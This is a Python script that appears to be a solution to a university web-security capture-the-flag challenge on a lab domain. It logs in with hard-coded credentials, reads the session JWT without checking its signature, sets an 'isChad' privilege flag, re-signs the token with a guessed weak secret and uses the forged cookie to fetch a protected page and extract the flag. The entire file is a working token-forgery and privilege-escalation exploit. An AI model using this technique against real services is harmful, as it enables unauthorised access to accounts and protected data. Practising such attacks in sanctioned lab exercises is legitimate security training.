#!/usr/bin/env python

import jwt
import re
import requests
import time


class colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    RESET = '\033[0m'


s = requests.Session()

s.cert = "/home/archer/uni/COMP6843/z3291100.pem"
flag_pattern = re.compile(r"COMP6443\{.+?\}")

login_url = "https://soycentral.quoccacorp.com/login"
chad_url = "https://soycentral.quoccacorp.com/chads"

grayons = {"user": "grayons", "password": "ilovesoy22"}
r = s.post(login_url, data=grayons)

if r.status_code != 200:
    print(f"{colors.RED}[!] Login Failed: {colors.RESET}{r.status_code}")
    print(r.text)
    exit(1)
else:
    print(f"{colors.GREEN}[+] Login Successful: {colors.RESET}{r.status_code}")

token = s.cookies.get("session")
print(f"{colors.GREEN}[+] JWT: {colors.RESET}{token}")
payload = jwt.decode(token, options={"verify_signature": False})
print(f"{colors.YELLOW}[+] Payload: {colors.RESET}{payload}")

payload["isChad"] = True
payload["iat"] = int(time.time())

auth = jwt.encode(payload, key="iloveyou", algorithm="HS256")
print(f"{colors.YELLOW}[+] Modified Token: {colors.RESET}{auth}")

s.cookies.clear()
s.cookies.set("session", auth)
token = s.cookies.get("session")
payload = jwt.decode(token, options={"verify_signature": False})
print(f"{colors.YELLOW}[+] Confirm Payload: {colors.RESET}{payload}")

chad = s.get(chad_url)
flag = flag_pattern.search(chad.text)

if flag:
    print(f"{colors.PURPLE}[+] Flag: {colors.RESET}{flag.group()}")
else:
    print(f"{colors.RED}[!] Flag not found!{colors.RESET}")
    print(chad.text)
